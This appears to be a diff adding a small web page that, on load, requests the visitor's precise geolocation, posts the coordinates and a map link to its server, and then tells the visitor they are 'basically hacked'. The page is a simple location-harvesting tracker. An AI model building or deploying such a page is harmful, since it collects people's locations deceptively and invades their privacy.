@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>We got your ip</title>
+  </head>
+  <body>
+    <p id="demo"></p>
+    <script>
+      const text = document.querySelector('#demo');
+
+      const success = (e) => {
+        const { latitude, longitude } = e.coords;
+        fetch('/', {
+          method: 'POST',
+          body: JSON.stringify({
+            latitude,
+            longitude,
+            mapURI: `https://www.openstreetmap.org/#map=18/${latitude}/${longitude}`,
+          }),
+          headers: {
+            'Content-Type': 'application/json',
+          },
+        })
+          .then((res) => res.json())
+          .then((res) => {
+            if (res.status === 'success') {
+              text.innerHTML =
+                'So we got your ip and geolocation, you are basically hacked';
+            }
+          });
+      };
+
+      const failure = () => {
+        text.innerHTML =
+          'Please turn on location or give permission to access location';
+      };
+
+      navigator.geolocation.getCurrentPosition(success, failure, {
+        enableHighAccuracy: true,
+      });
+    </script>
+  </body>
+</html>
